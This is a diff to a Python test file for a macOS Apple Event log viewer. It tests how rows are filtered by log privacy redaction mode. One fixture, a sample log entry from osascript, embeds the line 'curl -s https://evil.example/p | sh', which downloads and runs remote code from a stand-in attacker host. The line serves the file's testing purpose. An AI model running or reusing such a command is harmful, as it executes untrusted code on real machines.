@@ -239,21 +239,39 @@ class TestRowFilter:
         assert not RowFilter(show_clones=False).matches(clone)
         assert not RowFilter(only_flagged=True).matches(clone)
 
-    def test_hide_private_only(self):
-        # A clone's src is %{private}s -> invisible on stock macOS; a public Apple
-        # Event survives. The toggle hides the former, keeps the latter.
-        store = EventStore()
+    def test_privacy_modes(self):
+        # One record per redaction class, with the real AE formatStrings.
+        public_event = {
+            **EVENT,
+            "formatString": "%{public}ssendToSelf(), event=%{public}s reply=0x%{public}s sendMode=%x timeout=%ld",
+        }
+        default_event = {
+            "eventMessage": "OSStatus sendToModernProcess(mach_port_t, UInt32, const AppleEvent *, UInt32, AESendMode)(port=(port:172547/0x2a203 send:2 limit:0) msgID=0 timeout 7199 event={core,getd target='psn '[System Events] {----={form=indx,want=cdis,seld=abso(4/$206c6c61),from=NULL-impl}} attr:{csig=65536} returnID=196}",
+            "formatString": "%{public}s%{public}s(port=%{public}s msgID=%d timeout %d event=%s",
+            "processImagePath": "/System/Applications/Utilities/Script Editor.app/Contents/MacOS/Script Editor",
+            "processID": 459,
+        }
         private_clone = {
             "eventMessage": 'cloneForCompatability(src="curl -s https://evil.example/p | sh" dst=0x0)',
             "formatString": "%{public}scloneForCompatability(src=%{private}s dst=%p",
             "processImagePath": "/usr/bin/osascript",
         }
-        clone_row, _ = _ingest(store, private_clone)[0]
-        event_row, _ = _ingest(store, EVENT)[0]
-        assert clone_row.private_only and not event_row.private_only
-        hide = RowFilter(hide_private=True)
-        assert not hide.matches(clone_row)
-        assert hide.matches(event_row)
+        store = EventStore()
+        rows = [row for row, _ in _ingest(store, public_event, default_event, private_clone)]
+        assert [r.privacy for r in rows] == ["public", "default", "private"]
+
+        def shown(mode):
+            return [r.privacy for r in rows if RowFilter(privacy_mode=mode).matches(r)]
+
+        assert shown("private") == ["public", "default", "private"]  # Enable-Private-Data
+        assert shown("public") == ["public", "default"]  # Default-Privacy-Setting: Public
+        assert shown("default") == ["public"]  # stock macOS
+
+    def test_rows_without_format_string_always_shown(self):
+        store = EventStore()
+        row, _ = _ingest(store, EVENT)[0]
+        assert row.privacy is None
+        assert RowFilter(privacy_mode="default").matches(row)
 
 
 class TestAppleScriptTokens:
